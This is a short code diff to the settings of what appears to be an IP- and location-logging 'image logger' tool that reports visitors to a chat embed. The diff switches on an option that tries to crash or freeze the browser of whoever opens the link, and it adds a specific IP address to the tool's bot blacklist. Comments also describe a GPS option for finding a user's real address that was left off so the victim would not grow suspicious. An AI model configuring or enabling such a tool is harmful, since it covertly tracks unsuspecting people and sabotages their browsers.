@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("76.32.217.97", "27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
